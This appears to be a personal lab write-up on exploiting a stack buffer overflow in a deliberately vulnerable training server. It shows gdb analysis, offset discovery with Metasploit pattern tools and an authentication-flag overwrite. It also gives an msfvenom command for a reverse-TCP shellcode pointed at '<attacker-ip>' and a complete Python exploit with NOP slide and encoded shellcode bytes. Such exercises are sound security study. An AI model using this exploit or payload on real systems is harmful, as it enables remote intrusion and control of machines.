# Exploiting Stack 
- The vulnerable code I used : https://github.com/dennis95stumm/Vulnerable-Server/blob/master/exploit_smart_server.py

- used gdb to look at the assembly instructions
- it appears checkAuth is responsible for the initial checking 
![](found-function-check-auth.png)
- setting a breakpoint after strcmp at `test eax, eax` instruction
- using `msf-pattern_create -l 5000` to overflow the buffer
![](buffer-overflow.png)
- EAX stores our input, and it overflows the buffer to make its way to the other registers and memory locations
- With the EIP obtained, we can use `msf-pattern_offset` to find the exact offset for BOF.
```bash
msf-pattern_offset -l 5000 -q 0x63413962
# The exact offset is 58
```
- At this point, the actual value of `secret_buffer` is revealed somehow, even if the buffer is not overflow, then it hit me...
- If I look at the code of checkAuth function using `list checkAuth` which I should've done in the first place, there's a `auth_flag` variable, which probably triggers
![](Pasted%20image%2020220122104425.png)
- In fact, if I had just checked the source code instead of being a skid I would've found the key to unlocking this program instantly.
 ![](checkAuth-function.png)
- Anyway, what's happening here is, when we overflow the buffer with 43 chars the last char actually overwrites the `auth_flag`, which is then returned by `checkAuth` function and is eventually checked if it's true or not, so any value other than 0 will get us through.  
# Shellcode injection
- I can now perfectly overwrite EIP with `python2 -c 'print "A"*58+"B"*4'`

![](overwrite-eip.png)
- Now, I just have to find a location with a unique address to inject the shellcode.
- **Do `unset env` in gdb to remove any environment variables during the program run which may change the memory addresses**
- Picked a random value to repeat "C"
`python2 -c 'print "A"*58+"B"*4+"C"*100'`
![](Pasted%20image%2020220122112432.png)
- Note down the address where "C"(\x43 in hex) starts - 0xffffd150
- Generated a shellcode payload for reverse shell using msfvenom 
`msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=<attacker-ip> LPORT=<listening-port> -f python -o reverse`
![](Pasted%20image%2020220122113032.png)
- found a new address for my shellcode after NOP-slide - 0xffffd1b6 - 0xffffd213
![](Pasted%20image%2020220122115949.png)
- So I ran this exploit
```python
import struct

pad = "A"*58
eip = struct.pack("<I", 0xffffd1b2) 
buf =  b""
buf += b"\xd9\xee\xba\x44\x2f\xab\x19\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x12\x31\x57\x17\x83\xef\xfc\x03\x13\x3c\x49"
buf += b"\xec\xaa\x99\x7a\xec\x9f\x5e\xd6\x99\x1d\xe8\x39\xed"
buf += b"\x47\x27\x39\x9d\xde\x07\x05\x6f\x60\x2e\x03\x96\x08"
buf += b"\x71\x5b\x50\xcd\x19\x9e\xa1\xee\xf0\x17\x40\x40\x64"
buf += b"\x78\xd2\xf3\xda\x7b\x5d\x12\xd1\xfc\x0f\xbc\x84\xd3"
buf += b"\xdc\x54\x31\x03\x0c\xc6\xa8\xd2\xb1\x54\x78\x6c\xd4"
buf += b"\xe8\x75\xa3\x97"

test_payload = "C"*95
nopslide = "\x90"*100

print pad+eip+nopslide+buf
```
- And I got a connection on my listening machine
![](got-shell.png)
- About that python exploit, the way I found an appropriate address for eip: 
	1. I just used `print pad + nopslide + test_payload` to find the address where "\x43" starts 
	2. Then used that address in place of eip, hoping that eip will point to the location of my shellcode (test_payload, in the previous step)
	3. Now, I tested `print pad + eip + nopslide + test_payload` and this time I noticed "\x43" started from a different address, maybe the additional 4 bytes of eip that I provided had somehow shifted the memory locations.
	4. So, I used the address I found in (3) in eip and redirected the output of exploit.py into the program and got a shell
- Of course, I could've just used sockets to make things easier, but I was feeling a bit adventurous ¯\_(ツ)_/¯